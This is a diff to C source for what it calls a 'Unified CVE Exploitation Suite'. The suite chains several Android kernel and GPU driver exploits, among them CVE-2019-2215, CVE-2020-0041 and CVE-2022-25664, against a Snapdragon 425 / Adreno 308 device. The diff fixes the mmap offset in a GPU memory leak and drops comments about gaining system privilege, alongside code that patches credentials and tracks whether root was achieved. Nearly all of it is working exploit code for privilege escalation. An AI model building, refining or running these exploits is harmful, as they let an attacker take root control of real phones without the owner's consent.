@@ -99,7 +99,7 @@ static uint64_t g_cred_ptr = 0;
 static int g_cred_off = -1;
 static int g_al_off = -1;
 static int g_root_achieved = 0;
-static int g_system_privilege = 0;   /* 追加: system権限フラグ */
+static int g_system_privilege = 0;
 
 static struct {
     int cred;
@@ -202,7 +202,7 @@ static int exploit_cve_2019_2023(void) {
         return -1;
     }
     printf("  [+] Service registered successfully!\n");
-    g_system_privilege = 1;  /* system権限を獲得 */
+    g_system_privilege = 1;
 
     data = malloc(total_len);
     if (!data) { close(hwbinder_fd); return -1; }
@@ -628,7 +628,9 @@ static int exploit_cve_2020_0041_patch_cred(void) {
     return -1;
 }
 
-/* CVE-2022-25664 - simplified without context creation */
+/* ============================================================
+   CVE-2022-25664 - 修正: mmap offset = gpuaddr
+   ============================================================ */
 static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     int kgsl_fd;
     struct kgsl_gpumem_alloc alloc;
@@ -637,7 +639,7 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     uint64_t leaked_data[512];
     int found = 0;
 
-    printf("[CVE-2022-25664] Attempting GPU memory leak (simplified, no context)\n");
+    printf("[CVE-2022-25664] Attempting GPU memory leak (mmap offset fixed)\n");
 
     kgsl_fd = open(KGSL_DEVICE, O_RDWR);
     if (kgsl_fd < 0) {
@@ -645,9 +647,8 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
         return -1;
     }
 
-    /* Allocate GPU memory */
     memset(&alloc, 0, sizeof(alloc));
-    alloc.size = PAGE_SIZE * 4;  /* 16KB to increase chance of reusing pages */
+    alloc.size = PAGE_SIZE * 4;
     alloc.flags = 0;
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
         perror("  IOCTL_KGSL_GPUMEM_ALLOC");
@@ -657,14 +658,15 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     printf("  [+] GPU memory allocated: gpuaddr=0x%lx, size=%zu\n",
            alloc.gpuaddr, alloc.size);
 
-    /* mmap the buffer */
+    /* mmap with offset = gpuaddr */
     gpu_mem = mmap(NULL, alloc.size, PROT_READ | PROT_WRITE,
-                   MAP_SHARED, kgsl_fd, 0);
+                   MAP_SHARED, kgsl_fd, alloc.gpuaddr);
     if (gpu_mem == MAP_FAILED) {
-        perror("  mmap");
+        perror("  mmap (offset = gpuaddr)");
         close(kgsl_fd);
         return -1;
     }
+    printf("  [+] mmap succeeded at %p\n", gpu_mem);
 
     /* Invalidate cache to read actual physical memory */
     memset(&sync, 0, sizeof(sync));
@@ -1145,9 +1147,9 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v4.3\n");
+    printf("  Unified CVE Exploitation Suite v4.4\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023,\n");
-    printf("   CVE-2022-25664 (simplified), CVE-2021-1961,\n");
+    printf("   CVE-2022-25664 (fixed mmap), CVE-2021-1961,\n");
     printf("   CVE-2023-20938-inspired)\n");
     printf("  Target: SD425 / Adreno 308\n");
     printf("==================================================\n\n");
@@ -1179,7 +1181,7 @@ int main(void) {
         printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - simplified)\n");
+    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - fixed mmap offset)\n");
     if (exploit_cve_2022_25664_leak(&leaked_addr) == 0) {
         gpu_leak_ok = 1;
         printf("  [+] GPU leak successful: 0x%llx\n", (unsigned long long)leaked_addr);
